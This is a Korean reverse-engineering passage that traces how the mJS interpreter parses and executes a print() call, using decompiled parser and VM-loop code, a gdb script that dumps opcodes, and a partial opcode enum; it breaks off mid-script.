js 코드에서 mjs_print를 호출하려고 print()를 호출하면, 문자열 print는 parse_literal 함수에서 파싱된다.
```c
mjs_err __cdecl parse_literal(pstate *p, const tok *t)
{
  uint8_t v2; // al
  __m128d v3; // xmm1
  enum mjs_OPCODE v5; // [rsp+Ch] [rbp-54h]
  size_t oldlen; // [rsp+10h] [rbp-50h]
  unsigned __int64 uv; // [rsp+18h] [rbp-48h] BYREF
  double d; // [rsp+20h] [rbp-40h]
  double iv; // [rsp+28h] [rbp-38h] BYREF
  int next_tok; // [rsp+30h] [rbp-30h]
  int prev_tok; // [rsp+34h] [rbp-2Ch]
  int tok; // [rsp+38h] [rbp-28h]
  mjs_err res; // [rsp+3Ch] [rbp-24h]
  mbuf *bcode_gen; // [rsp+40h] [rbp-20h]
  const tok *ta; // [rsp+48h] [rbp-18h] BYREF
  pstate *pa; // [rsp+50h] [rbp-10h]

  pa = p;
  ta = t;
  bcode_gen = &p->mjs->bcode_gen;
  res = MJS_OK;
  tok = t->tok;
  if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, "src/mjs_parser.c", 276) )
    cs_log_printf("[%.*s] %p", pa->tok.len, pa->tok.ptr, &ta);
  *(_DWORD *)&v5 = ta->tok;
  if ( ta->tok == TOK_ASSIGN )
  {
    res = parse_object_literal(pa);
  }
  else
  {
    switch ( *(_DWORD *)&v5 )
    {
      case 8:
        if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, "src/mjs_parser.c", 331) )
          cs_log_printf("  PNEXT %d", 331LL);
        pnext(pa);
        res = parse_expr(pa);
        if ( pa->tok.tok != TOK_OPEN_PAREN )
          goto LABEL_39;
        break;
      case 0xA:
        res = parse_array_literal(pa);
        break;
      case 0xC8:
        d = strtod(ta->ptr, 0LL);
        uv = strtoul(ta->ptr + 2, 0LL, 16);
        if ( *ta->ptr == 48 && *((_BYTE *)ta->ptr + 1) == 120 )
        {
          v3 = _mm_sub_pd(
                 (__m128d)_mm_unpacklo_epi32(_mm_loadl_epi64((const __m128i *)&uv), (__m128i)xmmword_24020),
                 (__m128d)xmmword_24030);
          d = _mm_unpackhi_pd(v3, v3).m128d_f64[0] + v3.m128d_f64[0];
        }
        if ( modf(d, &iv) == 0.0 )
        {
          emit_byte(pa, 0xEu);
          emit_int(pa, (unsigned int)(int)d);
        }
        else
        {
          emit_byte(pa, 0xFu);
          emit_str(pa, ta->ptr, ta->len);
        }
        break;
      case 0xC9:
        emit_byte(pa, 0xBu);
        oldlen = bcode_gen->len;
        embed_string(bcode_gen, pa->cur_idx, ta->ptr, ta->len, 2u);
        pa->cur_idx += LODWORD(bcode_gen->len) - oldlen;
        break;
      case 0xCA:
        prev_tok = pa->prev_tok;
        next_tok = ptest(pa);
        emit_byte(pa, 0xBu);
        emit_str(pa, ta->ptr, ta->len);
        v2 = 9;
        if ( prev_tok == 0x14 )
          v2 = 3;
        emit_byte(pa, v2);                      // PUSH STR
        if ( !findtok(&s_assign_ops, next_tok)
          && !findtok(&s_postfix_ops, next_tok)
          && !findtok(&s_postfix_ops, prev_tok) )// ++, --
        {
          emit_byte(pa, 0x16u);
        }
        break;
      case 0xD4:
        emit_byte(pa, 0xDu);
        break;
      case 0xD7:
        res = parse_function(pa);
        break;
      case 0xDC:
        emit_byte(pa, 0x10u);
        break;
      case 0xDF:
        emit_byte(pa, 0x15u);
        break;
      case 0xE1:
        emit_byte(pa, 0xCu);
        break;
      case 0xE9:
        emit_byte(pa, 0x11u);
        break;
      default:
LABEL_39:
        mjs_set_errorf(
          pa->mjs,
          MJS_SYNTAX_ERROR,
          "parse error at line %d: [%.*s]",
          (unsigned int)pa->line_no,
          10LL,
          pa->tok.ptr);
        return 1;
    }
  }
  if ( tok != 0xD7 )
  {
    if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, "src/mjs_parser.c", 344) )
      cs_log_printf("  PNEXT %d", 344LL);
    pnext(pa);
  }
  return res;
}
```
여기서 주목할건 parse_function이다.

```c
static mjs_err_t parse_function(struct pstate *p) {
  size_t prologue, off;
  int arg_no = 0;
  int name_provided = 0;
  mjs_err_t res = MJS_OK;

  EXPECT(p, TOK_KEYWORD_FUNCTION);

  if (p->tok.tok == TOK_IDENT) {
    /* Function name was provided */
    struct tok tmp = p->tok;
    name_provided = 1;
    emit_byte(p, OP_PUSH_STR);
    emit_str(p, tmp.ptr, tmp.len);
    emit_byte(p, OP_PUSH_SCOPE);
    emit_byte(p, OP_CREATE);
    emit_byte(p, OP_PUSH_STR);
    emit_str(p, tmp.ptr, tmp.len);
    emit_byte(p, OP_FIND_SCOPE);
    pnext1(p);
  }

  emit_byte(p, OP_JMP);
  off = p->cur_idx;
  emit_init_offset(p);

  prologue = p->cur_idx;

  EXPECT(p, TOK_OPEN_PAREN);
  emit_byte(p, OP_NEW_SCOPE);
  // Emit names of function arguments
  while (p->tok.tok != TOK_CLOSE_PAREN) {
    if (p->tok.tok != TOK_IDENT) SYNTAX_ERROR(p);
    emit_byte(p, OP_SET_ARG);
    emit_int(p, arg_no);
    arg_no++;
    emit_str(p, p->tok.ptr, p->tok.len);
    if (ptest(p) == TOK_COMMA) pnext1(p);
    pnext1(p);
  }
  EXPECT(p, TOK_CLOSE_PAREN);
  if ((res = parse_block(p, 0)) != MJS_OK) return res;
  emit_byte(p, OP_RETURN);
  prologue += mjs_bcode_insert_offset(p, p->mjs, off,
                                      p->cur_idx - off - MJS_INIT_OFFSET_SIZE);
  emit_byte(p, OP_PUSH_FUNC);
  emit_int(p, p->cur_idx - 1 /* OP_PUSH_FUNC */ - prologue);
  if (name_provided) {
    emit_op(p, TOK_ASSIGN);
  }

  return res;
}
```
소스코드로 보면 명확하게 보인다. 
tok는 ident로 들어가기 때문에, 결국 print 문자열을 그대로 집어넣게 된다.

js가 인터프리터 언어라서 그런지 예상했던대로 그대로 문자열을 넣는다.
```c
  res = parse_statement_list(&p, 0);
  emit_byte(&p, 0x23u);                         // OP_EXIT
  *(_DWORD *)&p.mjs->bcode_gen.buf[start_idx + 8] = p.mjs->bcode_gen.len - start_idx;
  map_len = p.offset_lineno_map.len;
  llen = cs_varint_llen(SLODWORD(p.offset_lineno_map.len));
  mbuf_resize(&p.mjs->bcode_gen, llen + p.mjs->bcode_gen.size);
  cs_varint_encode(map_len, (uint8_t *)&p.mjs->bcode_gen.buf[p.mjs->bcode_gen.len], llen);
  p.mjs->bcode_gen.len += llen;
  mbuf_append(&p.mjs->bcode_gen, p.offset_lineno_map.buf, p.offset_lineno_map.len);
  *(_DWORD *)&p.mjs->bcode_gen.buf[start_idx] = p.mjs->bcode_gen.len - start_idx;
  mbuf_free(&p.offset_lineno_map);
  if ( res )
    mbuf_free(&mjsa->bcode_gen);
  else
    mjs_bcode_commit(mjsa);
  return res;
}
```
mjs_parse 함수의 뒷부분을 보면 파싱이 끝나고 mjs_bcode_commit을 통해서 mjs->bcode_parts로 바이트 코드를 옮기는 것을 알 수 있다.
### mjs_execute
```c
mjs_err_t __cdecl mjs_execute(mjs *mjs, size_t off, mjs_val_t *res)
{
  mjs_val_t v3; // rax
  mjs_val_t v4; // rax
  mjs_val_t v5; // rax
  mjs_val_t v6; // rax
  mjs_val_t v7; // rax
  mjs_val_t v8; // rax
  mjs_val_t v9; // rax
  mjs_val_t v10; // rax
  mjs_val_t v11; // rax
  mjs_val_t v12; // rax
  mjs_val_t v13; // rax
  mjs_val_t v14; // rax
  mjs_val_t v15; // rax
  mjs_val_t v16; // rax
  mjs_val_t v17; // rax
  double v18; // xmm0_8
  mjs_val_t v19; // rax
  __m128d v20; // xmm1
  mjs_val_t v21; // rax
  void (__fastcall *ptr)(mjs *); // rax
  mjs_val_t *v23; // rax
  mjs_val_t v24; // rax
  __m128d v25; // xmm1
  mjs_val_t v26; // rax
  __m128d v27; // xmm1
  mjs_val_t v28; // rax
  __m128d v29; // xmm1
  mjs_val_t v30; // rax
  mjs_val_t *v31; // rax
  mjs_val_t v32; // rax
  mjs_val_t v33; // rax
  mjs_val_t v34; // rax
  mjs_bcode_part *v35; // rax
  mjs_val_t v36; // rax
  mjs_err error; // [rsp+4h] [rbp-2DCh]
  mjs *v39; // [rsp+8h] [rbp-2D8h]
  mjs *v40; // [rsp+10h] [rbp-2D0h]
  mjs *v41; // [rsp+18h] [rbp-2C8h]
  mjs *v42; // [rsp+20h] [rbp-2C0h]
  mjs *v43; // [rsp+28h] [rbp-2B8h]
  mbuf *p_loop_addresses; // [rsp+30h] [rbp-2B0h]
  mbuf *v45; // [rsp+38h] [rbp-2A8h]
  mbuf *v46; // [rsp+68h] [rbp-278h]
  mjs *v47; // [rsp+70h] [rbp-270h]
  mjs *v48; // [rsp+78h] [rbp-268h]
  mjs_val_t v49; // [rsp+80h] [rbp-260h]
  mjs *v50; // [rsp+88h] [rbp-258h]
  mbuf *p_arg_stack; // [rsp+90h] [rbp-250h]
  mjs *v52; // [rsp+98h] [rbp-248h]
  mjs *v53; // [rsp+A0h] [rbp-240h]
  mjs *v54; // [rsp+A8h] [rbp-238h]
  mjs *v55; // [rsp+B0h] [rbp-230h]
  mjs *v56; // [rsp+B8h] [rbp-228h]
  mbuf *m; // [rsp+C0h] [rbp-220h]
  mjs *v58; // [rsp+C8h] [rbp-218h]
  mjs *v59; // [rsp+D0h] [rbp-210h]
  mjs *v60; // [rsp+D8h] [rbp-208h]
  mjs *v61; // [rsp+E0h] [rbp-200h]
  mjs *v62; // [rsp+E8h] [rbp-1F8h]
  mjs *v63; // [rsp+F0h] [rbp-1F0h]
  mjs *v64; // [rsp+F8h] [rbp-1E8h]
  mjs *v65; // [rsp+100h] [rbp-1E0h]
  mjs *v66; // [rsp+108h] [rbp-1D8h]
  mjs *v67; // [rsp+110h] [rbp-1D0h]
  mjs *v68; // [rsp+118h] [rbp-1C8h]
  size_t scopes_len_1; // [rsp+128h] [rbp-1B8h]
  size_t scopes_len_0; // [rsp+130h] [rbp-1B0h]
  int off_0; // [rsp+13Ch] [rbp-1A4h]
  int off_0a; // [rsp+13Ch] [rbp-1A4h]
  int l2; // [rsp+140h] [rbp-1A0h] BYREF
  int l1; // [rsp+144h] [rbp-19Ch] BYREF
  mjs_val_t b; // [rsp+148h] [rbp-198h]
  mjs_val_t a; // [rsp+150h] [rbp-190h]
  int op; // [rsp+15Ch] [rbp-184h]
  size_t retval_pos; // [rsp+160h] [rbp-180h]
  mjs_val_t v; // [rsp+168h] [rbp-178h]
  mjs_val_t key_3; // [rsp+170h] [rbp-170h]
  mjs_val_t obj_2; // [rsp+178h] [rbp-168h]
  int v82; // [rsp+180h] [rbp-160h]
  int n_7; // [rsp+184h] [rbp-15Ch]
  int llen2; // [rsp+188h] [rbp-158h] BYREF
  int llen1; // [rsp+18Ch] [rbp-154h] BYREF
  size_t off_call; // [rsp+190h] [rbp-150h]
  mjs_val_t retval_stack_idx; // [rsp+198h] [rbp-148h]
  mjs_val_t *func; // [rsp+1A0h] [rbp-140h]
  int func_pos; // [rsp+1ACh] [rbp-134h]
  size_t off_ret; // [rsp+1B0h] [rbp-130h]
  mjs_val_t scope; // [rsp+1B8h] [rbp-128h]
  mjs_val_t key_2; // [rsp+1C0h] [rbp-120h]
  mjs_val_t name; // [rsp+1C8h] [rbp-118h]
  mjs_val_t obj_1; // [rsp+1D0h] [rbp-110h]
  mjs_val_t *iterator; // [rsp+1D8h] [rbp-108h]
  int n_6; // [rsp+1E0h] [rbp-100h]
  int llen_6; // [rsp+1E4h] [rbp-FCh] BYREF
  int64_t n_5; // [rsp+1E8h] [rbp-F8h]
  int llen_5; // [rsp+1F4h] [rbp-ECh] BYREF
  int length; // [rsp+1F8h] [rbp-E8h]
  int llen_4; // [rsp+1FCh] [rbp-E4h] BYREF
  mjs_val_t val_0; // [rsp+200h] [rbp-E0h] BYREF
  mjs_val_t key_1; // [rsp+208h] [rbp-D8h]
  mjs_val_t obj_0; // [rsp+210h] [rbp-D0h]
  mjs_val_t arr; // [rsp+220h] [rbp-C0h]
  mjs_val_t val; // [rsp+228h] [rbp-B8h]
  mjs_val_t key_0; // [rsp+230h] [rbp-B0h]
  mjs_val_t obj; // [rsp+238h] [rbp-A8h]
  mjs_val_t key; // [rsp+240h] [rbp-A0h]
  int n_3; // [rsp+24Ch] [rbp-94h]
  int llen_3; // [rsp+250h] [rbp-90h] BYREF
  int n_2; // [rsp+254h] [rbp-8Ch]
  int llen_2; // [rsp+258h] [rbp-88h] BYREF
  int n_1; // [rsp+25Ch] [rbp-84h]
  int llen_1; // [rsp+260h] [rbp-80h] BYREF
  int n_0; // [rsp+264h] [rbp-7Ch]
  int llen_0; // [rsp+268h] [rbp-78h] BYREF
  int n; // [rsp+26Ch] [rbp-74h]
  int llen; // [rsp+270h] [rbp-70h] BYREF
  mjs_header_item_t bcode_offset; // [rsp+274h] [rbp-6Ch]
  mjs_bcode_part bp_0; // [rsp+278h] [rbp-68h]
  const uint8_t *code; // [rsp+298h] [rbp-48h]
  size_t start_off; // [rsp+2A0h] [rbp-40h]
  int loop_addresses_len; // [rsp+2A8h] [rbp-38h]
  int scopes_len; // [rsp+2ACh] [rbp-34h]
  int len; // [rsp+2B0h] [rbp-30h]
  int call_stack_len; // [rsp+2B4h] [rbp-2Ch]
  int stack_len; // [rsp+2B8h] [rbp-28h]
  uint8_t opcode; // [rsp+2BEh] [rbp-22h]
  uint8_t prev_opcode; // [rsp+2BFh] [rbp-21h]
  size_t i; // [rsp+2C0h] [rbp-20h]
  mjs_val_t *resa; // [rsp+2C8h] [rbp-18h]
  size_t offa; // [rsp+2D0h] [rbp-10h]
  mjs *mjsa; // [rsp+2D8h] [rbp-8h]

  mjsa = mjs;
  offa = off;
  resa = res;
  prev_opcode = 0x27;
  opcode = 0x27;
  stack_len = mjs->stack.len;
  call_stack_len = mjs->call_stack.len;
  len = mjs->arg_stack.len;
  scopes_len = mjs->scopes.len;
  loop_addresses_len = mjs->loop_addresses.len;
  start_off = off;
  bp_0 = *mjs_bcode_part_get_by_offset(mjs, off);
  mjs_set_errorf(mjs, MJS_OK, 0LL);
  free(mjs->stack_trace);
  mjs->stack_trace = 0LL;
  offa -= bp_0.start_idx;
  i = offa;
  while ( 2 )
  {
    if ( i >= bp_0.data.len )
      goto clean;
    mjsa->cur_bcode_offset = i;
    if ( (*((_BYTE *)mjsa + 464) & 2) != 0 && maybe_gc(mjsa) )
      *((_BYTE *)mjsa + 464) &= ~2u;
    code = (const uint8_t *)bp_0.data.p;
    mjs_disasm_single((const uint8_t *)bp_0.data.p, i);
    prev_opcode = opcode;
    opcode = code[i];
    switch ( opcode )
    {
      case 0u:
        goto LABEL_93;
      case 1u:
        mjs_pop(mjsa);
        goto LABEL_93;
      case 2u:
        v47 = mjsa;
        v24 = vtop(&mjsa->stack);
        mjs_push(v47, v24);
        goto LABEL_93;
      case 3u:
        a = mjs_pop(mjsa);
        b = mjs_pop(mjsa);
        mjs_push(mjsa, a);
        mjs_push(mjsa, b);
        goto LABEL_93;
      case 4u:
        n_0 = cs_varint_decode_unsafe(&code[i + 1], &llen_0);
        i += llen_0 + n_0;
        goto LABEL_93;
      case 6u:
        n_2 = cs_varint_decode_unsafe(&code[i + 1], &llen_2);
        i += llen_2;
        v60 = mjsa;
        v11 = vtop(&mjsa->stack);
        if ( mjs_is_truthy(v60, v11) )
          i += n_2;
        goto LABEL_93;
      case 7u:
        n_1 = cs_varint_decode_unsafe(&code[i + 1], &llen_1);
        i += llen_1;
        v61 = mjsa;
        v10 = mjs_pop(mjsa);
        if ( !mjs_is_truthy(v61, v10) )
        {
          mjs_push(mjsa, 0xFFF3000000000000LL);
          i += n_1;
        }
        goto LABEL_93;
      case 8u:
        n_3 = cs_varint_decode_unsafe(&code[i + 1], &llen_3);
        i += llen_3;
        v59 = mjsa;
        v12 = vtop(&mjsa->stack);
        if ( !mjs_is_truthy(v59, v12) )
          i += n_3;
        goto LABEL_93;
      case 9u:
        key = vtop(&mjsa->stack);
        v58 = mjsa;
        v13 = mjs_find_scope(mjsa, key);
        mjs_push(v58, v13);
        goto LABEL_93;
      case 0xAu:
        if ( !mjs_stack_size(&mjsa->scopes) )
          __assert_fail(
            "mjs_stack_size(&mjs->scopes) > 0",
            "src/mjs_exec.c",
            0x2D5u,
            "mjs_err_t mjs_execute(struct mjs *, size_t, mjs_val_t *)");
        v56 = mjsa;
        v15 = vtop(&mjsa->scopes);
        mjs_push(v56, v15);
        goto LABEL_93;
      case 0xBu:
        length = cs_varint_decode_unsafe(&code[i + 1], &llen_4);
        v55 = mjsa;
        v16 = mjs_mk_string(mjsa, (const char *)&code[i + 1 + llen_4], length, 1);
        mjs_push(v55, v16);
        i += length + llen_4;
        goto LABEL_93;
      case 0xCu:
        v65 = mjsa;
        v6 = mjs_mk_boolean(mjsa, 1);
        mjs_push(v65, v6);
        goto LABEL_93;
      case 0xDu:
        v66 = mjsa;
        v5 = mjs_mk_boolean(mjsa, 0);
        mjs_push(v66, v5);
        goto LABEL_93;
      case 0xEu:
        n_5 = cs_varint_decode_unsafe(&code[i + 1], &llen_5);
        v54 = mjsa;
        v17 = mjs_mk_number(mjsa, (double)(int)n_5);
        mjs_push(v54, v17);
        i += llen_5;
        goto LABEL_93;
      case 0xFu:
        n_6 = cs_varint_decode_unsafe(&code[i + 1], &llen_6);
        v53 = mjsa;
        v52 = mjsa;
        v18 = strtod((const char *)&code[i + 1 + llen_6], 0LL);
        v19 = mjs_mk_number(v52, v18);
        mjs_push(v53, v19);
        i += n_6 + llen_6;
        goto LABEL_93;
      case 0x10u:
        v68 = mjsa;
        v3 = mjs_mk_null();
        mjs_push(v68, v3);
        goto LABEL_93;
      case 0x11u:
        v67 = mjsa;
        v4 = mjs_mk_undefined();
        mjs_push(v67, v4);
        goto LABEL_93;
      case 0x12u:
        v64 = mjsa;
        v7 = mjs_mk_object(mjsa);
        mjs_push(v64, v7);
        goto LABEL_93;
      case 0x13u:
        v63 = mjsa;
        v8 = mjs_mk_array(mjsa);
        mjs_push(v63, v8);
        goto LABEL_93;
      case 0x14u:
        n = cs_varint_decode_unsafe(&code[i + 1], &llen);
        v62 = mjsa;
        v9 = mjs_mk_function(mjsa, i + bp_0.start_idx - n);
        mjs_push(v62, v9);
        i += llen;
        goto LABEL_93;
      case 0x15u:
        mjs_push(mjsa, mjsa->vals.this_obj);
        goto LABEL_93;
      case 0x16u:
        obj_0 = mjs_pop(mjsa);                  // SCOPE 
        key_1 = mjs_pop(mjsa);                  // ENCODED STR
        val_0 = 0xFFF3000000000000LL;
        if ( !getprop_builtin(mjsa, obj_0, key_1, &val_0) )// NOT PROPERTY BUILTIN
        {
          if ( mjs_is_object(obj_0) )
            val_0 = mjs_get_v_proto(mjsa, obj_0, key_1);// OBJECT -> GET PROTO
          else
            mjs_prepend_errorf(mjsa, MJS_TYPE_ERROR, "type error");
        }
        mjs_push(mjsa, val_0);
        if ( prev_opcode == 9 )
          mjsa->vals.last_getprop_obj = 0xFFF3000000000000LL;
        else
          mjsa->vals.last_getprop_obj = obj_0;
        goto LABEL_93;
      case 0x17u:
        obj = mjs_pop(mjsa);
        key_0 = mjs_pop(mjsa);
        if ( !mjs_get_own_property_v(mjsa, obj, key_0) )
          mjs_set_v(mjsa, obj, key_0, 0xFFF3000000000000LL);
        goto LABEL_93;
      case 0x18u:
        op = code[i + 1];
        exec_expr(mjsa, op);
        ++i;
        goto LABEL_93;
      case 0x19u:
        val = mjs_pop(mjsa);
        arr = mjs_pop(mjsa);
        if ( mjs_array_push(mjsa, arr, val) )
          mjs_set_errorf(mjsa, MJS_TYPE_ERROR, "append to non-array");
        goto LABEL_93;
      case 0x1Au:
        v82 = cs_varint_decode_unsafe(&code[i + 1], &llen1);
        n_7 = cs_varint_decode_unsafe(&code[llen1 + 1 + i], &llen2);
        key_3 = mjs_mk_string(mjsa, (const char *)&code[i + 1 + llen1 + llen2], n_7, 1);
        obj_2 = vtop(&mjsa->scopes);
        v = mjs_arg(mjsa, v82);
        mjs_set_v(mjsa, obj_2, key_3, v);
        i += n_7 + llen2 + llen1;
        goto LABEL_93;
      case 0x1Bu:
        m = &mjsa->scopes;
        v14 = mjs_mk_object(mjsa);
        push_mjs_val(m, v14);
        goto LABEL_93;
      case 0x1Cu:
        if ( mjsa->scopes.len > 1 )
          mjs_pop_val(&mjsa->scopes);
        else
          mjs_set_errorf(mjsa, MJS_INTERNAL_ERROR, "scopes underflow");
        goto LABEL_93;
      case 0x1Du:
        retval_stack_idx = vtop(&mjsa->arg_stack);
        func_pos = mjs_get_int(mjsa, retval_stack_idx) - 1;
        func = vptr(&mjsa->stack, func_pos);    // get pointer
        mjs_pop_val(&mjsa->arg_stack);
        if ( mjs_is_function(*func) )
        {
          call_stack_push_frame(mjsa, i + bp_0.start_idx, retval_stack_idx);
          off_call = mjs_get_func_addr(*func) - 1;
          bp_0 = *mjs_bcode_part_get_by_offset(mjsa, off_call);
          code = (const uint8_t *)bp_0.data.p;
          i = off_call - bp_0.start_idx;
          *func = 0xFFF3000000000000LL;
        }
        else if ( mjs_is_ffi_sig(*func) )
        {
          call_stack_push_frame(mjsa, i + bp_0.start_idx, retval_stack_idx);
          mjs_ffi_call2(mjsa);
          call_stack_restore_frame(mjsa);
        }
        else if ( mjs_is_foreign(*func) )
        {
          call_stack_push_frame(mjsa, i + bp_0.start_idx, retval_stack_idx);
          ptr = (void (__fastcall *)(mjs *))mjs_get_ptr(mjsa, *func);
          ptr(mjsa);
          call_stack_restore_frame(mjsa);
        }
        else
        {
          mjs_set_errorf(mjsa, MJS_TYPE_ERROR, "calling non-callable");
        }
        goto LABEL_93;
      case 0x1Eu:
        off_ret = call_stack_restore_frame(mjsa);
        if ( off_ret == 0x7FFFFFFF )
          goto clean;
        bp_0 = *mjs_bcode_part_get_by_offset(mjsa, off_ret);
        code = (const uint8_t *)bp_0.data.p;
        i = off_ret - bp_0.start_idx;
        if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, "src/mjs_exec.c", 781) )
          cs_log_printf("RETURNING TO %d", (unsigned int)(off_ret + 1));
LABEL_93:
        if ( mjsa->error == MJS_OK )
        {
          ++i;
          continue;
        }
        mjs_gen_stack_trace(mjsa, i + bp_0.start_idx - 1);
        mjsa->stack.len = stack_len;
        mjsa->call_stack.len = call_stack_len;
        mjsa->arg_stack.len = len;
        mjsa->scopes.len = scopes_len;
        mjsa->loop_addresses.len = loop_addresses_len;
        mjs_push(mjsa, 0xFFF3000000000000LL);
clean:
        error = mjsa->error;
        v35 = mjs_bcode_part_get_by_offset(mjsa, start_off);
        *((_BYTE *)v35 + 24) = error & 0xF | *((_BYTE *)v35 + 24) & 0xF0;
        v36 = mjs_pop(mjsa);
        *resa = v36;
        return mjsa->error;
      case 0x1Fu:
        off_0 = cs_varint_decode_unsafe(&code[i + 1], &l1);
        v43 = mjsa;
        p_loop_addresses = &mjsa->loop_addresses;
        v25 = _mm_sub_pd(
                (__m128d)_mm_unpacklo_epi32((__m128i)mjs_stack_size(&mjsa->scopes), (__m128i)xmmword_24020),
                (__m128d)xmmword_24030);
        v26 = mjs_mk_number(v43, _mm_unpackhi_pd(v25, v25).m128d_f64[0] + v25.m128d_f64[0]);
        push_mjs_val(p_loop_addresses, v26);
        v45 = &mjsa->loop_addresses;
        v27 = _mm_sub_pd(
                (__m128d)_mm_unpacklo_epi32((__m128i)(off_0 + l1 + i + 1), (__m128i)xmmword_24020),
                (__m128d)xmmword_24030);
        v28 = mjs_mk_number(mjsa, _mm_unpackhi_pd(v27, v27).m128d_f64[0] + v27.m128d_f64[0]);
        push_mjs_val(v45, v28);
        off_0a = cs_varint_decode_unsafe(&code[l1 + 1 + i], &l2);
        v46 = &mjsa->loop_addresses;
        v29 = _mm_sub_pd(
                (__m128d)_mm_unpacklo_epi32((__m128i)(off_0a + l2 + l1 + i + 1), (__m128i)xmmword_24020),
                (__m128d)xmmword_24030);
        v30 = mjs_mk_number(mjsa, _mm_unpackhi_pd(v29, v29).m128d_f64[0] + v29.m128d_f64[0]);
        push_mjs_val(v46, v30);
        i += l2 + l1;
        goto LABEL_93;
      case 0x20u:
        if ( mjs_stack_size(&mjsa->loop_addresses) < 3 )
        {
          mjs_set_errorf(mjsa, MJS_SYNTAX_ERROR, "misplaced 'break'");
        }
        else
        {
          mjs_pop_val(&mjsa->loop_addresses);
          v39 = mjsa;
          v33 = mjs_pop_val(&mjsa->loop_addresses);
          i = mjs_get_int(v39, v33) - 1;
          v40 = mjsa;
          v34 = mjs_pop_val(&mjsa->loop_addresses);
          scopes_len_1 = mjs_get_int(v40, v34);
          if ( mjs_stack_size(&mjsa->scopes) < scopes_len_1 )
            __assert_fail(
              "mjs_stack_size(&mjs->scopes) >= scopes_len",
              "src/mjs_exec.c",
              0x3B5u,
              "mjs_err_t mjs_execute(struct mjs *, size_t, mjs_val_t *)");
          mjsa->scopes.len = 8 * scopes_len_1;
          if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, "src/mjs_exec.c", 952) )
            cs_log_printf("BREAKING TO %d", (unsigned int)(i + 1));
        }
        goto LABEL_93;
      case 0x21u:
        if ( mjs_stack_size(&mjsa->loop_addresses) < 3 )
        {
          mjs_set_errorf(mjsa, MJS_SYNTAX_ERROR, "misplaced 'continue'");
        }
        else
        {
          v42 = mjsa;
          v31 = vptr(&mjsa->loop_addresses, -3);
          scopes_len_0 = mjs_get_int(v42, *v31);
          if ( mjs_stack_size(&mjsa->scopes) < scopes_len_0 )
            __assert_fail(
              "mjs_stack_size(&mjs->scopes) >= scopes_len",
              "src/mjs_exec.c",
              0x3A1u,
              "mjs_err_t mjs_execute(struct mjs *, size_t, mjs_val_t *)");
          mjsa->scopes.len = 8 * scopes_len_0;
          v41 = mjsa;
          v32 = vtop(&mjsa->loop_addresses);
          i = mjs_get_int(v41, v32) - 1;
        }
        goto LABEL_93;
      case 0x22u:
        if ( mjs_stack_size(&mjsa->call_stack) >= 5 )
        {
          v48 = mjsa;
          v23 = vptr(&mjsa->call_stack, -1);
          retval_pos = mjs_get_int(v48, *v23);
          v49 = mjs_pop(mjsa);
          *vptr(&mjsa->stack, (int)retval_pos - 1) = v49;
        }
        else
        {
          mjs_set_errorf(mjsa, MJS_INTERNAL_ERROR, "cannot return");
        }
        goto LABEL_93;
      case 0x23u:
        i = bp_0.data.len;
        goto LABEL_93;
      case 0x24u:
        bcode_offset = *(_DWORD *)&code[i + 5];
        i += bcode_offset;
        goto LABEL_93;
      case 0x25u:
        if ( prev_opcode != 22 )
          mjsa->vals.last_getprop_obj = 0xFFF3000000000000LL;
        push_mjs_val(&mjsa->arg_stack, mjsa->vals.last_getprop_obj);
        v50 = mjsa;
        p_arg_stack = &mjsa->arg_stack;
        v20 = _mm_sub_pd(
                (__m128d)_mm_unpacklo_epi32((__m128i)mjs_stack_size(&mjsa->stack), (__m128i)xmmword_24020),
                (__m128d)xmmword_24030);
        v21 = mjs_mk_number(v50, _mm_unpackhi_pd(v20, v20).m128d_f64[0] + v20.m128d_f64[0]);
        push_mjs_val(p_arg_stack, v21);
        goto LABEL_93;
      case 0x26u:
        iterator = vptr(&mjsa->stack, -1);
        obj_1 = *vptr(&mjsa->stack, -2);
        if ( mjs_is_object(obj_1) )
        {
          name = *vptr(&mjsa->stack, -3);
          key_2 = mjs_next(mjsa, obj_1, iterator);
          if ( key_2 != 0xFFF3000000000000LL )
          {
            scope = mjs_find_scope(mjsa, name);
            mjs_set_v(mjsa, scope, name, key_2);
          }
        }
        else
        {
          mjs_set_errorf(mjsa, MJS_TYPE_ERROR, "can't iterate over non-object value");
        }
        goto LABEL_93;
      default:
        mjs_dump(mjsa, 1);
        mjs_set_errorf(
          mjsa,
          MJS_INTERNAL_ERROR,
          "Unknown opcode: %d, off %d+%d",
          opcode,
          LODWORD(bp_0.start_idx),
          (unsigned int)i);
        i = bp_0.data.len;
        goto LABEL_93;
    }
  }
}
```
이 함수에서 VM이 돌아간다.

직접 OPCODE를 분석해보기 위해서 gdbscript를 작성했다.
```python
import gdb 
gdb.execute("start")
res = gdb.execute("vmmap",to_string=True)
res =res[230:]
binbase = int(res[res.find('0x') : res.find('0x')+8*2+2],16)

bp_off = [0x007219]
for i in bp_off:
    gdb.execute("b * "+hex(binbase + i))
gdb.execute("c")
opcode = []
l = 8
for i in range(l):
    rax = int(gdb.parse_and_eval("$rax"))
    opcode.append(rax)
    gdb.execute("c")
    print(i)
print(opcode)
```
OPCODE를 배열을 뽑아볼 수 있었다.
\[36, 11, 9, 22, 37, 11, 29, 35]
분석을 편하게 하기 위해서 파이썬 스크립트를 작성했다.
```python
str_ = '''enum mjs_opcode {
  OP_NOP,               /* ( -- ) */
  OP_DROP,              /* ( a -- ) */
  OP_DUP,               /* ( a -- a a ) */
  OP_SWAP,              /* ( a b -- b a ) */
  OP_JMP,               /* ( -- ) */
  OP_JMP_TRUE,          /* ( -- ) */
  OP_JMP_NEUTRAL_TRUE,  /* ( -- ) */
  OP_JMP_FALSE,         /* ( -- ) */
  OP_JMP_NEUTRAL_FALSE, /* ( -- ) */
  OP_FIND_SCOPE,        /* ( a -- a b ) */
  OP_PUSH_SCOPE,        /* ( -- a ) */
  OP_PUSH_STR,          /* ( -- a ) */
  OP_PUSH_TRUE,         /* ( -- a ) */
  OP_PUSH_FALSE,        /* ( -- a ) */
  OP_PUSH_INT,          /* ( -- a ) */
  OP_PUSH_DBL,          /* ( -- a ) */
  OP_PUSH_NULL,         /* ( -- a ) */
  OP_PUSH_UNDEF,        /* ( -- a ) */
  OP_PUSH_OBJ,          /* ( -- a ) */
  OP_PUSH_ARRAY,        /* ( -- a ) */
  OP_PUSH_FUNC,         /* ( -- a ) */
  OP_PUSH_THIS,         /* ( -- a ) */
  OP_GET,               /* ( key obj  -- obj[key] ) */
